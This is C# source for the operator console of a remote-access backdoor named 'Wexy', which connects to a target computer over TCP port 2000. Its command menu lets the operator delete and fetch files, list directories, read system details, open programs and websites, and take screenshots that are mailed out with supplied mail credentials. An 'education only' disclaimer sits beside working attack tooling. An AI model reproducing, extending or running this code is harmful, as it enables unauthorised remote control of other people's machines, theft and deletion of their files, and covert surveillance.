using System;
using System.Net.Sockets;
using System.Text;

namespace Wexy_Client
{
    public class Client
    {
        public static string received_data;
        public static bool isConnected; //This will allow us to track whether or not we are connected to a server
        public static NetworkStream Receiver; //this is used to get data from the server
        public static NetworkStream Writer; //this is used to send commands to the server

        public static void SendCommand(string Command)
        {
            try
            {
                if (Command != "showfiles>" && Command != "pcname>" && Command != "showfolders>" && Command != "show>" && Command != "getos>")
                {
                    //Creates a packet to hold the command, and gets the bytes from the string variable
                    byte[] Packet = Encoding.ASCII.GetBytes(Command);

                    //Send the command over the network
                    Writer.Write(Packet, 0, Packet.Length);

                    //Flush out any extra data that didnt send in the start.
                    Writer.Flush();
                }
                else
                {
                    switch (Command)
                    {
                        case "pcname>":
                            byte[] Packet = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet, 0, Packet.Length);
                            Writer.Flush();
                            ReceiveData();
                            Console.WriteLine("PC Name : " + received_data);
                            break;

                        case "showfiles>":
                            byte[] Packet1 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet1, 0, Packet1.Length);
                            Writer.Flush();
                            ReceiveData();
                            Console.WriteLine(received_data);
                            break;
                        case "showfolders>":
                            byte[] Packet2 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet2, 0, Packet2.Length);
                            Writer.Flush();
                            ReceiveData();
                            Console.WriteLine(received_data);
                            break;
                        case "show>":
                            byte[] Packet3 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet3, 0, Packet3.Length);
                            Writer.Flush();
                            ReceiveData();
                            Console.WriteLine(received_data);
                            break;
                        case "getos>":
                            byte[] Packet4 = Encoding.ASCII.GetBytes(Command);
                            Writer.Write(Packet4, 0, Packet4.Length);
                            Writer.Flush();
                            ReceiveData();
                            Console.WriteLine(received_data);
                            break;
                    }
                }
            }
            catch
            {
                isConnected = false;
                Console.WriteLine("Disconnected from server!");
                Console.ReadKey();
                Writer.Close();
            }
        }

        public static void ReceiveData()
        {
            //Infinite loop 
            while (true)
            {
                //try to read the data from the client
                try
                {
                    //Packet of the received data
                    byte[] RecPacket = new byte[1000];

                    //Read a command from the client.
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    //Flush the receiver
                    Receiver.Flush();

                    //Convert the packet into readable string
                    string data = Encoding.ASCII.GetString(RecPacket);

                    /* Split the command into two different strings based on the splitter we made, >
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(data, ">");

                    //Get the actual command.
                    data = CommandArray[0]; */
                    //folders = data;
                    /*pcname = data;
                    files = data; */
                    received_data = data;
                    break;
                }
                catch
                {
                    break;
                }
            }
        }

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Title = "Client - Offline";

            TcpClient client = new TcpClient();

            Console.WriteLine("Wexy backdoor - Made by Welsen");
            Console.WriteLine("This program was made for education and training purpose only.");
            Console.WriteLine("I'm not responsible for any damage caused by the usage of this application.\n");
            Console.WriteLine("Enter server IP :");
            string IP = Console.ReadLine();

            try
            {
                client.Connect(IP, 2000);
                isConnected = true;

                //Changes the console title
                Console.Title = "Client - Online";

            }
            catch
            {
                Console.WriteLine("Error connecting to target server ! /nPress any key to restart the program.");
                Console.ReadKey();
                Environment.Exit(0);
            }
            Console.WriteLine("Connection successfully established to " + IP);
            Console.WriteLine("Type help for a list of available commands.");

            while (isConnected)
            {
                Writer = client.GetStream();
                Receiver = client.GetStream();
                Console.Write("wexy> ");
                string command = Console.ReadLine();

                if (command == "help")
                {
                    Console.WriteLine("----------------------COMMANDS----------------------------");
                    Console.WriteLine("- (Open a website) 'open>http://example.com>'");
                    Console.WriteLine("- (Display a message on target's screen) 'msg>message here>'");
                    Console.WriteLine("- (Take a screenshot and send it) 'ss>mail_sender>mail_pass>mail_to>'");
                    Console.WriteLine("- (Get target's computer name) 'pcname>'");
                    Console.WriteLine("- (Show files (then write 'show>') 'showfiles>directory_path>'");
                    Console.WriteLine("- (Show folders (then write 'show>') 'showfolders>directory_path>'");
                    Console.WriteLine("- (Delete a file) 'del>file_path>'");
                    Console.WriteLine("- (Get file) 'getFile>file_path>'");
                    Console.WriteLine("- (Get OS Version) 'getos>'");
                    Console.WriteLine("- (Open application) 'openApp>application_name>'");
                    Console.WriteLine("- (Disconnect) 'quit'");
                    Console.WriteLine("----------------------------------------------------------");

                }
                else if (command == "quit")
                {
                    try
                    {
                        client.Client.Shutdown(SocketShutdown.Both);
                        client.Client.Close();
                        client.Client.Dispose();
                        client.Close();
                        Environment.Exit(0);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Unable to disconnect :" + ex.Message);
                    }
                }
                else
                {
                    SendCommand(command);
                }
            }
            Environment.Exit(0);
        }//end main
    }//End class client
}
